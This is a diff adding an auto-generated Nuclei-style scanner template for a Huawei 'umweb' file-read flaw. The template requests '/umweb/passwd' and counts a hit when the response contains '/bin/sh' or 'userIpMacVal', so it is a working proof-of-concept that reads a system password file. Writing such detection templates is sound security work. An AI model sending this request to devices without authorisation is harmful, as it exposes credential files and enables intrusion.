@@ -1,0 +1,23 @@
+# 自动生成：tools/import_ref_pocs.py，请勿手工编辑（重跑会覆盖）
+id: ref-huawei-umweb_readfile
+info:
+  name: "Huawei umweb_readfile"
+  author: imported-from-myscan
+  severity: high
+  tags: [imported, huawei, ref-poc, readfile]
+  description: "由参考项目脚本静态导入：Huawei/umweb_readfile（类型 READFILE）。"
+http:
+  - method: GET
+    path:
+      - "/"
+      - "/umweb/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "=\"userIpMacVal\""
+          - "/bin/sh"
